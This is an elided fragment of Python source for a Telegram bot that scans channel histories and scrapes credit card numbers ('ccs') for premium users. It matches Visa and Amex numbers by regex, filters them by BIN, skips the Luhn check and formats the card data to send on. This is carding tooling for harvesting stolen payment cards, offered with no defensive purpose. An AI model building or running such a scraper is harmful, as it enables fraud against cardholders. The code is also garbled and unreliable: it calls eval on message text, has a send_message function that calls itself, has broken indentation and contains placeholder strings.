...
async def scrape(Client,message):
  ...
  mess=eval(str(message))
  userr = mess["chat"]["id"]
  if userr in premium_list or userr in admins:
    ...
    async for i in app.get_chat_history(cha):
      ...
      try:
        ...
        if count==0:
          ...
          if ctr>=1000:
            if ctr%1000==0:
              a_m=await bot.edit_message_text(chat_id=message.chat.id,message_id=a_m.id,text="<b>ꜱᴄᴀɴɴᴇᴅ ᴍᴇꜱꜱᴀɢᴇꜱ -</b>{}\n{} - <b>ᴄᴄꜱ ᴀʀᴇ ꜱᴄʀᴀᴘᴇᴅ!!</b>".format(ctr,count))
          else:
            if ctr%100==0:
              a_m=await bot.edit_message_text(chat_id=message.chat.id,message_id=a_m.id,text="<b>ꜱᴄᴀɴɴᴇᴅ ᴍᴇꜱꜱᴀɢᴇꜱ -</b>{}\n{} - <b>ᴄᴄꜱ ᴀʀᴇ ꜱᴄʀᴀᴘᴇᴅ!!</b>".format(ctr,count))
        ...
        if True:
          if binz in x[:8]:
            ...
            if ctr>50000:
                file.close()
                await message.reply("Can't Exceed Limit(Flood Wait)", quote=True)
                a_m=await bot.edit_message_text(chat_id=message.chat.id,message_id=a_m.id,text="<b>ꜱᴄᴀɴɴᴇᴅ ᴍᴇꜱꜱᴀɢᴇꜱ -</b>{}\n{} - <b>ᴄᴄꜱ ᴀʀᴇ ꜱᴄʀᴀᴘᴇᴅ!!</b>".format(ctr,count))
...
async def raw(client, update, users, chats):
    ...
    try:
      ids= (p["message"]["peer_id"]["channel_id"])
    except:
      pass
    if True:
...
try:
            ...
            if sacanumvisa:
                ...
                raise ValueError("No valid Visa card number found.")
except Exception:
            sacanumamex = re.findall(detectamex, rawdata)
            if sacanumamex:
                carduno = sacanumamex[0]
                ...
                carduno = None
                tipocard = None
                print("Error: No valid card number found in the provided raw data.")
if tipocard in ["3", "4", "5", "6"]:
            # Simulated card data logic here...
            card_send_formatted = "Your formatted card data here."

            # Use the async function to send the message
            async def send_message(chat_id, text):
              await bot.send_message(chat_id, text)

# Then call the function where needed:
              async def send_message(chat_id, text):
                await send_message(chat_id, card_send_formatted)
...
try:
          ...
          existe = False
        # check_luhn = verify(str(x.split("|")[0]))
check_luhn = True
...
if existe is False:
          if check_luhn is True:
            ...
            try:
              ...
              card_send_formatted="<code>{}</code> <code>{}</code>".format(ids,x)
              print(e)
              #await bot.send_message(chat_id, text=card_send_formatted)
          else:
            print("error")
